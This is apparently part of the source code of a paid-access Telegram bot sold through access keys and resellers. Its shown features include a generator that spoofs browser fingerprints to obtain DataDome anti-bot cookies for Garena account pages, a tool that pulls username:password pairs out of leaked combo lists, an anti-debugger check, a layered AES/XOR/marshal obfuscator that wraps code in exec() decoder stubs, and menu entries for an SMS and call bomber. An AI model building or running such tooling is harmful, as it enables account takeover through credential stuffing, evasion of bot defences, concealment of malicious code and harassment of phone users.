            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
        }

        payload = {
            'jsData': json.dumps({
                "ttst": 76.7, "ua": headers['user-agent'],
                "br_oh": 824, "br_ow": 1536, "br_h": 738, "br_w": 260,
                "rs_h": 864, "rs_w": 1536, "rs_cd": 24,
                "lg": "en-US", "pr": 1.25, "tz": -480
            }),
            'eventCounters': '[]',
            'jsType': 'ch',
            'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
            'ddk': 'AE3F04AD3F0D3A462481A337485081',
            'Referer': 'https://account.garena.com/',
            'request': '/',
            'responsePage': 'origin',
            'ddv': '4.35.4'
        }

        data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

        try:
            response = requests.post(self.url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            response_json = response.json()

            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                datadome = cookie_string.split(';')[0].split('=')[1]
                return datadome
            else:
                return None
        except Exception as e:
            logging.error(f"Error generating DataDome cookie: {e}")
            return None
    
    def generate_cookie_file(self, datadome_value):
        """Generate a Python file with the DataDome cookie"""
        cookie_content = f'''# DataDome Cookie File
# Generated on: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

cookies = {{
    "datadome": "{datadome_value}"
}}

def get_cookies():
    """Return the DataDome cookies"""
    return cookies

if __name__ == "__main__":
    print("DataDome Cookie:", cookies["datadome"])
'''
        return cookie_content

# ========== URL & DUPLICATE REMOVER CLASS ==========
class URLDuplicateRemover:
    def __init__(self):
        self.processed = 0
        self.saved = 0
        
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════╗
║         𝚄𝚁𝙻 𝚁𝚎𝚖𝚘𝚟𝚎𝚛 & 𝙲𝚛𝚎𝚍𝚎𝚗𝚝𝚒𝚊𝚕𝚜          ║
║        𝙴𝚡𝚝𝚛𝚊𝚌𝚝𝚘𝚛 𝚟2 - 𝙰𝚍𝚟𝚊𝚗𝚌𝚎𝚍          ║
╚══════════════════════════════════════════╝{Style.RESET_ALL}
"""
        return banner
    
    def loading_animation(self):
        for _ in range(100):
            time.sleep(0.01)
    
    def remove_url_and_keep_user_pass(self, line, remove_urls=True):
        if not remove_urls:
            return line.strip()
        match = re.search(r'([^:]+:[^:]+)$', line.strip())
        if match:
            return match.group(1)
        return None
    
    def process_file(self, input_file, output_file, remove_duplicates=False):
        self.processed = 0
        self.saved = 0
        
        try:
            # Count total lines
            total_lines = sum(1 for _ in open(input_file, 'r', encoding='utf-8', errors='ignore'))
            
            unique_creds = set()
            
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as infile, \
                 open(output_file, 'w', encoding='utf-8') as outfile:
                
                for line in infile:
                    self.processed += 1
                    result = self.remove_url_and_keep_user_pass(line, not remove_duplicates)
                    if result:
                        if remove_duplicates and result not in unique_creds:
                            unique_creds.add(result)
                            outfile.write(result + '\n')
                            self.saved += 1
                        elif not remove_duplicates:
                            outfile.write(result + '\n')
                            self.saved += 1
                            
            return True, self.processed, self.saved
            
        except FileNotFoundError:
            return False, 0, 0
        except Exception as e:
            return False, 0, 0

# ========== ENCRYPTION FUNCTIONS ==========
def anti_debug_code():
    return """
import sys
if hasattr(sys, 'gettrace') and sys.gettrace():
    sys.exit("[!] Debugger Detected!")
"""

def aes_encrypt(data):
    cipher = AES.new(hashlib.sha256(AES_KEY).digest()[:32], AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return cipher.nonce + tag + ciphertext

def aes_decrypt(data, key):
    nonce = data[:16]
    tag = data[16:32]
    ciphertext = data[32:]
    cipher = AES.new(hashlib.sha256(key).digest()[:32], AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

async def encrypt_data_async(data_content: str, method: int, encode_count: int):
    data_content = data_content.replace('\x00', '')
    original_bytes = data_content.encode('utf-8')

    processed_data = original_bytes
    xor_key_for_decoder = None

    marshal_methods = [1, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 44]
    if method in marshal_methods:
        try:
            compiled_code = compile(data_content, '<x>', 'exec')
            processed_data = marshal.dumps(compiled_code)
        except SyntaxError as e:
            logging.error(f"SyntaxError during initial compile of Python code: {e}")
            raise
        except Exception as e:
            logging.error(f"Unexpected error during initial compile/marshal: {e}")
            raise

    final_output_data = processed_data

    for iteration in range(encode_count):
        current_data_for_iteration = final_output_data

        try:
            if method == 1:
                pass
            elif method == 2:
                final_output_data = zlib.compress(current_data_for_iteration)
            elif method == 3:
                final_output_data = base64.b16encode(current_data_for_iteration)
            elif method == 4:
                final_output_data = base64.b32encode(current_data_for_iteration)
            elif method == 5:
                final_output_data = base64.b64encode(current_data_for_iteration)
            elif method == 6:
                final_output_data = lzma.compress(current_data_for_iteration)
            elif method == 7:
                final_output_data = gzip.compress(current_data_for_iteration)

            elif method == 8:
                final_output_data = base64.b16encode(zlib.compress(current_data_for_iteration))
            elif method == 9:
                final_output_data = base64.b32encode(zlib.compress(current_data_for_iteration))
            elif method == 10:
                final_output_data = base64.b64encode(zlib.compress(current_data_for_iteration))
            elif method == 11:
                final_output_data = base64.b16encode(gzip.compress(current_data_for_iteration))
            elif method == 12:
                final_output_data = base64.b32encode(gzip.compress(current_data_for_iteration))
            elif method == 13:
                final_output_data = base64.b64encode(gzip.compress(current_data_for_iteration))
            elif method == 14:
                final_output_data = base64.b16encode(lzma.compress(current_data_for_iteration))
            elif method == 15:
                final_output_data = base64.b32encode(lzma.compress(current_data_for_iteration))
            elif method == 16:
                final_output_data = base64.b64encode(lzma.compress(current_data_for_iteration))

            elif method in [17, 18, 19]:
                if method == 17: final_output_data = zlib.compress(current_data_for_iteration)
                elif method == 18: final_output_data = gzip.compress(current_data_for_iteration)
                elif method == 19: final_output_data = lzma.compress(current_data_for_iteration)
            elif method in [20, 21, 22]:
                if method == 20: final_output_data = base64.b16encode(current_data_for_iteration)
                elif method == 21: final_output_data = base64.b32encode(current_data_for_iteration)
                elif method == 22: final_output_data = base64.b64encode(current_data_for_iteration)

            elif method == 23:
                final_output_data = base64.b16encode(zlib.compress(current_data_for_iteration))
            elif method == 24:
                final_output_data = base64.b32encode(zlib.compress(current_data_for_iteration))
            elif method == 25:
                final_output_data = base64.b64encode(zlib.compress(current_data_for_iteration))
            elif method == 26:
                final_output_data = base64.b16encode(lzma.compress(current_data_for_iteration))
            elif method == 27:
                final_output_data = base64.b32encode(lzma.compress(current_data_for_iteration))
            elif method == 28:
                final_output_data = base64.b64encode(lzma.compress(current_data_for_iteration))
            elif method == 29:
                final_output_data = base64.b16encode(gzip.compress(current_data_for_iteration))
            elif method == 30:
                final_output_data = base64.b32encode(gzip.compress(current_data_for_iteration))
            elif method == 31:
                final_output_data = base64.b64encode(gzip.compress(current_data_for_iteration))
            elif method == 32:
                compressed_intermediate = zlib.compress(current_data_for_iteration)
                lzma_intermediate = lzma.compress(compressed_intermediate)
                final_output_data = base64.b16encode(lzma_intermediate)
            elif method == 33:
                compressed_intermediate = zlib.compress(current_data_for_iteration)
                lzma_intermediate = lzma.compress(compressed_intermediate)
                final_output_data = base64.b32encode(lzma_intermediate)
            elif method == 34:
                compressed_intermediate = zlib.compress(current_data_for_iteration)
                lzma_intermediate = lzma.compress(compressed_intermediate)
                final_output_data = base64.b64encode(lzma_intermediate)
            elif method == 35:
                compressed_intermediate = zlib.compress(current_data_for_iteration)
                gzip_intermediate = gzip.compress(compressed_intermediate)
                final_output_data = base64.b16encode(gzip_intermediate)
            elif method == 36:
                compressed_intermediate = zlib.compress(current_data_for_iteration)
                gzip_intermediate = gzip.compress(compressed_intermediate)
                final_output_data = base64.b32encode(gzip_intermediate)
            elif method == 37:
                compressed_intermediate = zlib.compress(current_data_for_iteration)
                gzip_intermediate = gzip.compress(compressed_intermediate)
                final_output_data = base64.b64encode(gzip_intermediate)
            elif method == 38:
                zlib_data = zlib.compress(current_data_for_iteration)
                lzma_data = lzma.compress(zlib_data)
                gzip_data = gzip.compress(lzma_data)
                final_output_data = base64.b16encode(gzip_data)
            elif method == 39:
                zlib_data = zlib.compress(current_data_for_iteration)
                lzma_data = lzma.compress(zlib_data)
                gzip_data = gzip.compress(lzma_data)
                final_output_data = base64.b32encode(gzip_data)
            elif method == 40:
                zlib_data = zlib.compress(current_data_for_iteration)
                lzma_data = lzma.compress(zlib_data)
                gzip_data = gzip.compress(lzma_data)
                final_output_data = base64.b64encode(gzip_data)
            elif method == 41:
                final_output_data = base64.b64encode(current_data_for_iteration)

            elif method == 42:
                if iteration == 0:
                    temp_data = zlib.compress(current_data_for_iteration)
                    temp_data = lzma.compress(temp_data)
                    temp_data = aes_encrypt(temp_data)
                    final_output_data = base64.b64encode(temp_data)
                else:
                    temp_data = base64.b64decode(current_data_for_iteration)
                    temp_data = aes_decrypt(temp_data, AES_KEY)
                    temp_data = lzma.decompress(temp_data)
                    temp_data = zlib.decompress(temp_data)

                    temp_data = zlib.compress(temp_data)
                    temp_data = lzma.compress(temp_data)
                    temp_data = aes_encrypt(temp_data)
                    final_output_data = base64.b64encode(temp_data)

            elif method == 44:
                if iteration == 0:
                    xor_key = os.urandom(32)
                    xor_key_for_decoder = base64.b64encode(xor_key)
                else:
                    xor_key = base64.b64decode(xor_key_for_decoder)

                def xor_encrypt_inner(data_bytes, key_bytes):
                    return bytes([b ^ key_bytes[idx % len(key_bytes)] for idx, b in enumerate(data_bytes)])
                
                temp_data = zlib.compress(current_data_for_iteration)
                temp_data = lzma.compress(temp_data)
                temp_data = gzip.compress(temp_data)
                temp_data = xor_encrypt_inner(temp_data, xor_key)
                temp_data = aes_encrypt(temp_data)
                final_output_data = base64.b64encode(temp_data)
            
            else:
                raise ValueError(f"Invalid or unhandled method number for iteration {iteration+1}: {method}")

        except Exception as e:
            logging.error(f"Error during encryption step (method {method}, iteration {iteration+1}): {e}")
            raise

    await asyncio.sleep(0.1)

    if method == 44:
        return (final_output_data, xor_key_for_decoder)
    return final_output_data

def generate_decoder_stub(method, aes_key_bytes=None, xor_key_encoded=None):
    aes_key_str_repr = repr(aes_key_bytes) if aes_key_bytes else repr(b'')

    if method == 1:
        return "import marshal\nexec(marshal.loads({}))"
    elif method == 2:
        return "import zlib\nexec(zlib.decompress({}).decode())"
    elif method == 3:
        return "import base64\nexec(base64.b16decode({}).decode())"
    elif method == 4:
        return "import base64\nexec(base64.b32decode({}).decode())"
    elif method == 5:
        return "import base64\nexec(base64.b64decode({}).decode())"
    elif method == 6:
        return "import lzma\nexec(lzma.decompress({}).decode())"
    elif method == 7:
        return "import gzip\nexec(gzip.decompress({}).decode())"
    elif method == 8:
        return "import zlib, base64\nexec(zlib.decompress(base64.b16decode({})).decode())"
    elif method == 9:
        return "import zlib, base64\nexec(zlib.decompress(base64.b32decode({})).decode())"
    elif method == 10:
        return "import zlib, base64\nexec(zlib.decompress(base64.b64decode({})).decode())"
    elif method == 11:
        return "import gzip, base64\nexec(gzip.decompress(base64.b16decode({})).decode())"
    elif method == 12:
        return "import gzip, base64\nexec(gzip.decompress(base64.b32decode({})).decode())"
    elif method == 13:
        return "import gzip, base64\nexec(gzip.decompress(base64.b64decode({})).decode())"
    elif method == 14:
        return "import lzma, base64\nexec(lzma.decompress(base64.b16decode({})).decode())"
    elif method == 15:
        return "import lzma, base64\nexec(lzma.decompress(base64.b32decode({})).decode())"
    elif method == 16:
        return "import lzma, base64\nexec(lzma.decompress(base64.b64decode({})).decode())"
    elif method == 17:
        return "import marshal, zlib\nexec(marshal.loads(zlib.decompress({})))"
    elif method == 18:
        return "import marshal, gzip\nexec(marshal.loads(gzip.decompress({})))"
    elif method == 19:
        return "import marshal, lzma\nexec(marshal.loads(lzma.decompress({})))"
    elif method == 20:
        return "import marshal, base64\nexec(marshal.loads(base64.b16decode({})))"
    elif method == 21:
        return "import marshal, base64\nexec(marshal.loads(base64.b32decode({})))"
    elif method == 22:
        return "import marshal, base64\nexec(marshal.loads(base64.b64decode({})))"
    elif method == 23:
        return "import marshal, zlib, base64\nexec(marshal.loads(zlib.decompress(base64.b16decode({}))))"
    elif method == 24:
        return "import marshal, zlib, base64\nexec(marshal.loads(zlib.decompress(base64.b32decode({}))))"
    elif method == 25:
        return "import marshal, zlib, base64\nexec(marshal.loads(zlib.decompress(base64.b64decode({}))))"
    elif method == 26:
        return "import marshal, lzma, base64\nexec(marshal.loads(lzma.decompress(base64.b16decode({}))))"
    elif method == 27:
        return "import marshal, lzma, base64\nexec(marshal.loads(lzma.decompress(base64.b32decode({}))))"
    elif method == 28:
        return "import marshal, lzma, base64\nexec(marshal.loads(lzma.decompress(base64.b64decode({}))))"
    elif method == 29:
        return "import marshal, gzip, base64\nexec(marshal.loads(gzip.decompress(base64.b16decode({}))))"
    elif method == 30:
        return "import marshal, gzip, base64\nexec(marshal.loads(gzip.decompress(base64.b32decode({}))))"
    elif method == 31:
        return "import marshal, gzip, base64\nexec(marshal.loads(gzip.decompress(base64.b64decode({}))))"
    elif method == 32:
        return f"""
import marshal, zlib, lzma, base64
data = {{0}}
data = base64.b16decode(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 33:
        return f"""
import marshal, zlib, lzma, base64
data = {{0}}
data = base64.b32decode(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 34:
        return f"""
import marshal, zlib, lzma, base64
data = {{0}}
data = base64.b64decode(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 35:
        return f"""
import marshal, zlib, gzip, base64
data = {{0}}
data = base64.b16decode(data)
data = gzip.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 36:
        return f"""
import marshal, zlib, gzip, base64
data = {{0}}
data = base64.b32decode(data)
data = gzip.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 37:
        return f"""
import marshal, zlib, gzip, base64
data = {{0}}
data = base64.b64decode(data)
data = gzip.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 38:
        return f"""
import marshal, zlib, lzma, gzip, base64
data = {{0}}
data = base64.b16decode(data)
data = gzip.decompress(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 39:
        return f"""
import marshal, zlib, lzma, gzip, base64
data = {{0}}
data = base64.b32decode(data)
data = gzip.decompress(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 40:
        return f"""
import marshal, zlib, lzma, gzip, base64
data = {{0}}
data = base64.b64decode(data)
data = gzip.decompress(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 41:
        return "import base64\nexec(base64.b64decode({}).decode())"
    elif method == 42:
        return f"""
import marshal, zlib, lzma, base64, hashlib
from Crypto.Cipher import AES

AES_KEY = {aes_key_str_repr}

def aes_decrypt(data):
    nonce = data[:16]
    tag = data[16:32]
    ciphertext = data[32:]
    cipher = AES.new(hashlib.sha256(AES_KEY).digest()[:32], AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

data = {{0}}
data = base64.b64decode(data)
data = aes_decrypt(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    elif method == 44:
        return f"""
import marshal, zlib, lzma, gzip, base64, hashlib
from Crypto.Cipher import AES

AES_KEY = {aes_key_str_repr}
XOR_KEY = base64.b64decode({repr(xor_key_encoded)})

def xor_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_decrypt(data):
    nonce = data[:16]
    tag = data[16:32]
    ciphertext = data[32:]
    cipher = AES.new(hashlib.sha256(AES_KEY).digest()[:32], AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

data = {{0}}
data = base64.b64decode(data)
data = aes_decrypt(data)
data = xor_decrypt(data, XOR_KEY)
data = gzip.decompress(data)
data = lzma.decompress(data)
data = zlib.decompress(data)
exec(marshal.loads(data))
"""
    else:
        raise ValueError("Invalid method!")

ENCRYPTION_METHODS_DISPLAY = {
    1: "Marshal Only", 2: "Zlib Only", 3: "Base16 Only", 4: "Base32 Only", 5: "Base64 Only",
    6: "Lzma Only", 7: "Gzip Only", 8: "Zlib + Base16", 9: "Zlib + Base32", 10: "Zlib + Base64",
    11: "Gzip + Base16", 12: "Gzip + Base32", 13: "Gzip + Base64", 14: "Lzma + Base16",
    15: "Lzma + Base32", 16: "Lzma + Base64", 17: "Marshal + Zlib", 18: "Marshal + Gzip",
    19: "Marshal + Lzma", 20: "Marshal + Base16", 21: "Marshal + Base32", 22: "Marshal + Base64",
    23: "Marshal + Zlib + B16", 24: "Marshal + Zlib + B32", 25: "Marshal + Zlib + B64",
    26: "Marshal + Lzma + B16", 27: "Marshal + Lzma + B32", 28: "Marshal + Lzma + B64",
    29: "Marshal + Gzip + B16", 30: "Marshal + Gzip + B32", 31: "Marshal + Gzip + B64",
    32: "Marshal + Zlib + Lzma + B16", 33: "Marshal + Zlib + Lzma + B32", 34: "Marshal + Zlib + Lzma + B64",
    35: "Marshal + Zlib + Gzip + B16", 36: "Marshal + Zlib + Gzip + B32", 37: "Marshal + Zlib + Gzip + B64",
    38: "Marshal + Zlib + Lzma + Gzip + B16", 39: "Marshal + Zlib + Lzma + Gzip + B32",
    40: "Marshal + Zlib + Lzma + Gzip + B64", 41: "Simple Encoder",
    42: "Strong Encoder (AES + Marshal + Zlib + Lzma + B64)",
    44: "Ultra Strong Encoder (AES + Marshal + Zlib + Lzma + Gzip + B64 + XOR)",
}

ENCRYPTION_METHODS_PER_PAGE = 8

def build_encryption_keyboard(page: int = 0):
    keyboard = []
    
    all_method_keys = sorted([k for k in ENCRYPTION_METHODS_DISPLAY.keys() if k != 43])
    total_methods = len(all_method_keys)
    
    start_index = page * ENCRYPTION_METHODS_PER_PAGE
    end_index = start_index + ENCRYPTION_METHODS_PER_PAGE

    current_page_methods = all_method_keys[start_index:end_index]

    for method_num in current_page_methods:
        button_text = ENCRYPTION_METHODS_DISPLAY[method_num]
        callback_data = f"enc_method_{method_num}"
        keyboard.append([InlineKeyboardButton(f"✨ {method_num}. {button_text}", callback_data=callback_data)])
    
    navigation_row = []
    if page > 0:
        navigation_row.append(InlineKeyboardButton("⬅️ 𝙿𝚁𝙴𝚅𝙸𝙾𝚄𝚂", callback_data=f"enc_page_{page - 1}"))
    
    total_pages = (total_methods + ENCRYPTION_METHODS_PER_PAGE - 1) // ENCRYPTION_METHODS_PER_PAGE
    navigation_row.append(InlineKeyboardButton(f"Page {page + 1}/{total_pages}", callback_data="enc_current_page_noop"))
    
    if end_index < total_methods:
        navigation_row.append(InlineKeyboardButton("➡️ 𝙽𝙴𝚇𝚃", callback_data=f"enc_page_{page + 1}"))
    
    if navigation_row:
        keyboard.append(navigation_row)

    keyboard.append([InlineKeyboardButton("❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝙴𝚗𝚌𝚛𝚢𝚙𝚝𝚒𝚘𝚗", callback_data="cancel_encryption_conv")])
    
    return InlineKeyboardMarkup(keyboard)

SELECTING_ENC_METHOD, SELECTING_ENC_COUNT, UPLOADING_ENC_FILE = range(3)

# ========== LOGGING SETUP ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ultimate_bot.log'),
        logging.StreamHandler()
    ]
)

# ========== DATA MANAGEMENT FUNCTIONS ==========
def load_existing_data():
    global USER_ACCESS, ACCESS_KEYS, USED_KEYS, USER_STATS, USER_ROLES
    
    if os.path.exists(ACCESS_FILE):
        try:
            with open(ACCESS_FILE, "r") as f:
                data = json.load(f)
                
                if "user_roles" in data:
                    USER_ROLES.update({int(k): v for k, v in data["user_roles"].items()})
                
                if "users" in data:
                    for user in data["users"]:
                        user_id = user["user_id"]
                        if user["access_expires"] is None:
                            USER_ACCESS[user_id] = None
                        else:
                            expire_date = datetime.datetime.fromisoformat(user["access_expires"].replace('Z', '+00:00'))
                            USER_ACCESS[user_id] = expire_date.timestamp()
                        
                        USER_STATS[user_id] = {"generations": user.get("generations", 0), "last_active": user.get("last_active")}
                        if user_id not in USER_ROLES:
                            USER_ROLES[user_id] = user.get("role", "user")
                else:
                    USER_ACCESS = {int(k): (v if v is None else float(v)) for k, v in data.get("user_access", {}).items()}
                    USER_STATS = {int(k): v for k, v in data.get("user_stats", {}).items()}
                    ACCESS_KEYS = data.get("access_keys", {})
                    USED_KEYS = set(data.get("used_keys", []))
                    for uid in USER_ACCESS.keys():
                        if uid == ADMIN_ID:
                            USER_ROLES[uid] = "owner"
                        elif uid not in USER_ROLES:
                            USER_ROLES[uid] = "user"

            logging.info(f"Loaded {len(USER_ACCESS)} existing users from access.json")
        except Exception as e:
            logging.error(f"Error loading access.json: {e}")
    
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, "r") as f:
                data = json.load(f)
                if "keys" in data:
                    for key_data in data["keys"]:
                        key = key_data["key"]
                        if not key_data.get("used", False):
                            ACCESS_KEYS[key] = {
                                "expires_at": None,
                                "days": key_data.get("days", 30),
                                "created_by": key_data.get("created_by", ADMIN_ID)
                            }
                        else:
                            USED_KEYS.add(key)
            logging.info(f"Loaded {len(ACCESS_KEYS)} available keys from keys.json")
        except Exception as e:
            logging.error(f"Error loading keys.json: {e}")

    USER_ROLES[ADMIN_ID] = "owner"
    logging.info(f"Loaded {len(USER_ROLES)} user roles.")

def save_access():
    users_data = []
    for user_id, access_timestamp in USER_ACCESS.items():
        expires_str = datetime.datetime.fromtimestamp(access_timestamp).isoformat() + 'Z' if access_timestamp is not None else None
        users_data.append({
            "user_id": user_id,
            "access_expires": expires_str,
            "generations": USER_STATS.get(user_id, {}).get("generations", 0),
            "last_active": USER_STATS.get(user_id, {}).get("last_active"),
            "role": USER_ROLES.get(user_id, "user")
        })

    data = {
        "users": users_data,
        "access_keys": ACCESS_KEYS,
        "used_keys": list(USED_KEYS),
        "user_roles": {str(k): v for k, v in USER_ROLES.items()}
    }
    
    with open(ACCESS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def has_access(user_id):
    if user_id == ADMIN_ID:
        return True
    
    if MAINTENANCE_MODE:
        return False

    if user_id not in USER_ACCESS:
        return False
    if USER_ACCESS[user_id] is None:
        return True
    return USER_ACCESS[user_id] > datetime.datetime.now().timestamp()

def has_role(user_id: int, required_role: str) -> bool:
    return USER_ROLES.get(user_id) == required_role

def is_at_least_role(user_id: int, min_role: str) -> bool:
    role_hierarchy = {"user": 0, "reseller": 1, "owner": 2}
    user_role_level = role_hierarchy.get(USER_ROLES.get(user_id, "user"), 0)
    min_role_level = role_hierarchy.get(min_role, 0)
    return user_role_level >= min_role_level

def get_database_stats():
    stats = {}
    total_lines = 0
    
    for db_name, file_path in DATABASE_FILES.items():
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    line_count = sum(1 for line in f if line.strip())
                stats[db_name] = line_count
                total_lines += line_count
            else:
                stats[db_name] = 0
        except Exception as e:
            logging.error(f"Error reading {file_path}: {e}")
            stats[db_name] = 0
    
    return stats, total_lines

async def delete_generated_file(file_path):
    try:
        await asyncio.sleep(300)  # 5 minutes
        if os.path.exists(file_path):
            os.remove(file_path)
            logging.info(f"Deleted generated file: {file_path}")
    except Exception as e:
        logging.error(f"Error deleting file {file_path}: {e}")

# ========== MAIN BOT FUNCTIONS ==========
async def start(update: Update, context: CallbackContext, edit_message_id: Optional[int] = None):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("Start function called with no effective message.")
        return

    user = update.message.from_user if update.message else update.callback_query.from_user if update.callback_query else None
    if not user:
        logging.warning("Start function called with no effective user.")
        return
        
    user_id = user.id
    
    if user_id not in USER_ROLES:
        USER_ROLES[user_id] = "user"
        save_access()
    
    if user_id not in USER_STATS:
        USER_STATS[user_id] = {"generations": 0, "last_active": None}
    USER_STATS[user_id]["last_active"] = datetime.datetime.now().isoformat()
    save_access()

    inline_keyboard_layout = []
    welcome_msg = ""

    if is_at_least_role(user_id, "owner"):
        inline_keyboard_layout = [
            [InlineKeyboardButton("📂 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙵𝙸𝙻𝙴𝚂", callback_data="show_generate_menu"),
             InlineKeyboardButton("📊 𝙼𝚈 𝚂𝚃𝙰𝚃𝙸𝚂𝚃𝙸𝙲𝚂", callback_data="show_stats")],
            [InlineKeyboardButton("⭐ 𝚄𝚂𝙴 𝙰𝙲𝙲𝙴𝚂𝚂 𝙺𝙴𝚈", callback_data="prompt_key"),
             InlineKeyboardButton("🔐 𝙿𝚈𝚃𝙷𝙾𝙽 𝙴𝙽𝙲𝚁𝚈𝙿𝚃𝙾𝚁", callback_data="start_encryption")],
            [InlineKeyboardButton("🛠️ 𝚄𝚁𝙻 𝙰𝙽𝙳 𝙳𝚄𝙿𝙻𝙸𝙲𝙰𝚃𝙴 𝚁𝙴𝙼𝙾𝚅𝙴𝚁", callback_data="url_duplicate_remover")],
            [InlineKeyboardButton("🛡️ 𝙳𝙰𝚃𝙰𝙳𝙾𝙼𝙴 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙾𝚁", callback_data="datadome_menu")],
            [InlineKeyboardButton("💣 𝚂𝙼𝚂 𝙰𝙽𝙳 𝙲𝙰𝙻𝙻 𝙱𝙾𝙼𝙱𝙴𝚁", callback_data="sms_bomber_menu")],
            [InlineKeyboardButton("🚀 𝚂𝙾𝙲𝙸𝙰𝙻 𝙼𝙴𝙳𝙸𝙰 𝙱𝙾𝙾𝚂𝚃𝙴𝚁", callback_data="social_media_booster_menu")],
            [InlineKeyboardButton("👑 𝙰𝙳𝙼𝙸𝙽 𝙿𝙰𝙽𝙴𝙻", callback_data="show_admin_panel")],
            [InlineKeyboardButton("📣 𝚂𝙴𝙽𝙳 𝙰𝙽𝙽𝙾𝚄𝙽𝙲𝙴𝙼𝙴𝙽𝚃", callback_data="admin_announce"),
             InlineKeyboardButton("🔴 𝚁𝙴𝚅𝙾𝙺𝙴 𝙺𝙴𝚈", callback_data="admin_revoke")],
            [InlineKeyboardButton("📋 𝚄𝚂𝙴𝚁 𝙻𝙸𝚂𝚃𝚂", callback_data="admin_users"),
             InlineKeyboardButton("🧰 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴 𝚂𝚃𝙰𝚃𝚄𝚂", callback_data="show_db_status")],
            [InlineKeyboardButton("🗑️ 𝙳𝙴𝙻𝙴𝚃𝙴 𝚂𝙸𝙽𝙶𝙻𝙴 𝙺𝙴𝚈", callback_data="admin_delete_single_key")],
            [InlineKeyboardButton("🛠️ 𝙼𝙰𝙸𝙽𝚃𝙴𝙽𝙰𝙽𝙲𝙴 (𝙾𝙽/𝙾𝙵𝙵)", callback_data="show_maintenance_options")],
            [InlineKeyboardButton("👥 𝙼𝙰𝙽𝙰𝙶𝙴 𝚁𝙾𝙻𝙴𝚂", callback_data="admin_manage_roles")],
            [InlineKeyboardButton("💬 𝙵𝙴𝙴𝙳𝙱𝙰𝙲𝙺 𝙷𝙴𝚁𝙴", callback_data="prompt_feedback")]
        ]
        welcome_msg = (
            f"👑 **𝚆𝚎𝚕𝚌𝚘𝚖𝚎, {user.first_name}! 𝚈𝚘𝚞'𝚛𝚎 𝚝𝚑𝚎 𝙱𝚘𝚜𝚜!**\n\n"
            "✨ *𝙰𝚍𝚖𝚒𝚗 𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜 𝙰𝚝 𝚈𝚘𝚞𝚛 𝙷𝚊𝚗𝚍𝚜:*\n"
            "• **👑 𝙰𝚍𝚖𝚒𝚗 𝙿𝚊𝚗𝚎𝚕**: 𝙵𝚞𝚕𝚕 𝚌𝚘𝚗𝚝𝚛𝚘𝚕, 𝚞𝚕𝚝𝚒𝚖𝚊𝚝𝚎 𝚙𝚘𝚠𝚎𝚛.\n"
            "• **🔑 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝙺𝚎𝚢**: 𝙲𝚛𝚎𝚊𝚝𝚎 𝚊𝚌𝚌𝚎𝚜𝚜 𝚔𝚎𝚢𝚜 𝚏𝚘𝚛 𝚗𝚎𝚠 𝚞𝚜𝚎𝚛𝚜.\n"
            "• **📣 𝚂𝚎𝚗𝚍 𝙰𝚗𝚗𝚘𝚞𝚗𝚌𝚎𝚖𝚎𝚗𝚝**: 𝙱𝚛𝚘𝚊𝚍𝚌𝚊𝚜𝚝 𝚖𝚎𝚜𝚜𝚊𝚐𝚎𝚜 𝚝𝚘 𝚊𝚕𝚕 𝚋𝚘𝚝 𝚞𝚜𝚎𝚛𝚜.\n"
